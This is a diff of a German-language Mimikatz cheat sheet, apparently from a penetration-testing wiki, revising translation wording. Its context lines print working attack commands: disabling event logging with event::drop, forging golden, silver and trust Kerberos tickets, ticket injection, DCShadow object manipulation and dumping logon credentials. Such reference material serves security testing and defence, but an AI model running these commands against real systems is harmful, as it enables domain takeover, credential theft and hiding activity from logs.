@@ -38,7 +38,7 @@ Das Manipulieren von Ereignisprotokollen in Mimikatz umfasst zwei Hauptaktionen:
 - **Befehl**: Diese Aktion zielt darauf ab, die Ereignisprotokolle zu löschen, um es schwieriger zu machen, böswillige Aktivitäten nachzuverfolgen.
 - Mimikatz bietet in seiner Standarddokumentation keinen direkten Befehl zum Löschen von Ereignisprotokollen über die Befehlszeile. Das Manipulieren von Ereignisprotokollen umfasst jedoch typischerweise die Verwendung von Systemtools oder Skripten außerhalb von Mimikatz, um spezifische Protokolle zu löschen (z. B. mit PowerShell oder dem Windows-Ereignisanzeige).
 
-#### Experimentelle Funktion: Patchen des Ereignisdienstes
+#### Experimentelles Feature: Patchen des Ereignisdienstes
 
 - **Befehl**: `event::drop`
 - Dieser experimentelle Befehl ist darauf ausgelegt, das Verhalten des Ereignisprotokollierungsdienstes zu ändern, wodurch effektiv verhindert wird, dass neue Ereignisse aufgezeichnet werden.
@@ -66,11 +66,11 @@ Beispiel:
 ```bash
 mimikatz "kerberos::golden /user:admin /domain:example.com /sid:S-1-5-21-123456789-123456789-123456789 /krbtgt:ntlmhash /ptt" exit
 ```
-### Erstellung von Silver Tickets
+### Silver Ticket Erstellung
 
 Silver Tickets gewähren Zugriff auf spezifische Dienste. Wichtiger Befehl und Parameter:
 
-- Befehl: Ähnlich wie Golden Ticket, zielt jedoch auf spezifische Dienste ab.
+- Befehl: Ähnlich wie Golden Ticket, zielt aber auf spezifische Dienste ab.
 - Parameter:
 - `/service`: Der Dienst, der angegriffen werden soll (z.B. cifs, http).
 - Andere Parameter ähnlich wie bei Golden Ticket.
@@ -79,14 +79,14 @@ Beispiel:
 ```bash
 mimikatz "kerberos::golden /user:user /domain:example.com /sid:S-1-5-21-123456789-123456789-123456789 /target:service.example.com /service:cifs /rc4:ntlmhash /ptt" exit
 ```
-### Erstellung von Vertrauens-Tickets
+### Trust Ticket Erstellung
 
-Vertrauens-Tickets werden verwendet, um auf Ressourcen über Domänen hinweg zuzugreifen, indem Vertrauensverhältnisse genutzt werden. Wichtiger Befehl und Parameter:
+Trust Tickets werden verwendet, um auf Ressourcen über Domänen hinweg zuzugreifen, indem Vertrauensverhältnisse genutzt werden. Wichtiger Befehl und Parameter:
 
 - Befehl: Ähnlich wie Golden Ticket, aber für Vertrauensverhältnisse.
 - Parameter:
 - `/target`: Der FQDN der Ziel-Domäne.
-- `/rc4`: Der NTLM-Hash für das Vertrauens-Konto.
+- `/rc4`: Der NTLM-Hash für das Vertrauenskonto.
 
 Beispiel:
 ```bash
@@ -102,7 +102,7 @@ mimikatz "kerberos::golden /domain:child.example.com /sid:S-1-5-21-123456789-123
 - **Cache übergeben**:
 
 - Befehl: `kerberos::ptc`
-- Injiziert Kerberos-Tickets aus Cache-Dateien.
+- Injektiert Kerberos-Tickets aus Cache-Dateien.
 - Beispiel: `mimikatz "kerberos::ptc /ticket:ticket.kirbi" exit`
 
 - **Ticket übergeben**:
@@ -118,7 +118,7 @@ mimikatz "kerberos::golden /domain:child.example.com /sid:S-1-5-21-123456789-123
 
 ### Active Directory Manipulation
 
-- **DCShadow**: Eine Maschine vorübergehend als DC für die AD-Objektmanipulation agieren lassen.
+- **DCShadow**: Temporär einen Computer als DC für die Manipulation von AD-Objekten agieren lassen.
 
 - `mimikatz "lsadump::dcshadow /object:targetObject /attribute:attributeName /value:newValue" exit`
 
@@ -164,7 +164,7 @@ mimikatz "kerberos::golden /domain:child.example.com /sid:S-1-5-21-123456789-123
 - **PRIVILEGE::Debug**: Debug-Rechte erhalten.
 - `mimikatz "privilege::debug" exit`
 
-### Anmeldeinformationen Dumping
+### Anmeldeinformationen dumpen
 
 - **SEKURLSA::LogonPasswords**: Anmeldeinformationen für angemeldete Benutzer anzeigen.
 
